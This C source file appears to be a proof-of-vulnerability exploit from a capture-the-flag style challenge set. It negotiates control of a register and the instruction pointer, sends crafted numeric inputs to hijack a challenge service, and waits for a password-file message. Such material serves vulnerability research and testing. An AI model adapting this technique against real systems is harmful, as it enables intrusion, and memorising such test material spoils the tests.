/*
 * Copyright (C) Narf Industries <info@narfindustries.com>
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
 * OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
 * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
 * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
 * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include <libpov.h>

void itoa(unsigned int n, char *s) {
    int i = 0;
    unsigned int orig = n;
    do {
        i++;
    } while ((n /= 10 ) > 0);

    s[i] = '\n';
    s[i+1] = '\0';
    n = orig;

    do {
        s[--i] = n % 10 + '0';
    } while ((n /= 10 ) > 0);
}

int streq(char *s1, char *s2) {
    while (*s1++ == *s2++ && (*(s1-1)));

    return (*(s1-1) == *(s2-1));
}

int main(void) {
   unsigned char *temp;
   char num[13] = {0};
   unsigned int size = 256;
   static unsigned char delim[] = "\x0a";
   char *setup = "blah\n1\n";
   type1_vals t1vals;
   type1_negotiate(0x00ffffff, 0xffffffff, 2, &t1vals);

   transmit_all(0, setup, strlen(setup));

   itoa(t1vals.regval, num);
   transmit_all(0, num, strlen(num));

   itoa(0x80000000|(t1vals.ipval&0x00ffffff), num);
   transmit_all(0, num, strlen(num));

   transmit_all(0, "0\n", 2);


    while(1) {
        delimited_read(0, &temp, &size, delim, 1);
        if(!temp)
            break;
        if (streq((char*)temp,"Thanks for waiting! Here is your password file. Welcome!"))
            break;
        size = 256;
    }
}
